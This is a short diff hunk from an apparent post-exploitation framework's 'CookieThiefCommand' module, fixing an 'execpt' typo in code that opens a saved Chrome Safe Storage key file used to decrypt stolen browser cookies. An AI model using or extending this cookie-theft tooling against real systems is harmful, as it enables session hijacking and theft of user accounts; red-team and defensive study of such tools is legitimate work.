@@ -107,7 +107,7 @@ class CookieThiefCommand(CommandBase):
         ccs_password = ""
         try:
             ccs_keyfile = open("/Mythic/mythic/chainbreaker/passwords/generic/ChromeSafeStorage.txt", "r")
-        execpt Exception as e:
+        except Exception as e:
             print("Chrome Safe Storage key file failed to open with error: " + str(e))
             sys.stdout.flush()
 
